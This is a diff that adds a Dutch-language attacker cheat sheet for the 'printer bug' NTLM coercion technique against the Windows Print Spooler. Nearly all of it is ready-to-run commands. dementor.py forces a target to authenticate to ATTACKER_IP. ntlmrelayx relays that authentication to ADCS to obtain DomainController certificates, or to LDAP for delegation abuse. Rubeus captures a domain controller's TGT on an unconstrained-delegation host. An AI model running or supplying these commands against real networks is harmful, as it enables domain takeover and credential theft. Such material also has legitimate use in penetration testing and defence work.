@@ -1,0 +1,50 @@
+# Dementor — Printer Bug / SpoolService trigger (NTLM coercion)
+# Forceert Print Spooler service van doelwit om NTLM te authenticeren naar attacker
+#
+# === Syntax ===
+# python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET
+#
+# === Belangrijkste opties ===
+# -u USER        Gebruikersnaam (verplicht — authenticated aanval)
+# -p PASS        Wachtwoord
+# -d DOMAIN      Domeinnaam
+# ATTACKER_IP    IP waar authenticatie naartoe gestuurd wordt (listener)
+# TARGET         Doelwit server met Print Spooler actief
+#
+# === Voorbeelden ===
+
+# === Basis coercion trigger ===
+python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET
+
+# === Relay naar ADCS (certificaat aanvragen) ===
+# 1. Start relay
+impacket-ntlmrelayx -t http://ADCS_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# 2. Trigger Dementor
+python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC
+
+# === Relay naar LDAP (voor RBCD of Shadow Credentials) ===
+impacket-ntlmrelayx -t ldap://DC --delegate-access -smb2support
+python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET
+
+# === Unconstrained delegation aanval ===
+# 1. Start Rubeus op unconstrained delegation server
+Rubeus.exe monitor /interval:5
+
+# 2. Trigger Dementor naar die server
+python3 dementor.py -u USER -p PASS -d DOMAIN UNCONSTRAINED_SERVER DC
+
+# 3. Rubeus vangt TGT van DC$ op
+
+# === Alternatief: SpoolSample (C#, draait op Windows) ===
+SpoolSample.exe TARGET ATTACKER_IP
+
+# === Controleer of Spooler actief is ===
+ls \\TARGET\pipe\spoolss
+# Of via Impacket
+rpcdump.py DOMAIN/USER:PASS@TARGET | grep MS-RPRN
+
+# Noot: Vereist dat Print Spooler service draait op doelwit
+# Noot: Altijd authenticated — je hebt geldige credentials nodig
+# Noot: Spooler staat standaard aan op alle Windows machines (incl. DCs)
+# Noot: Combineer met ntlmrelayx of Rubeus voor vervolg-aanval
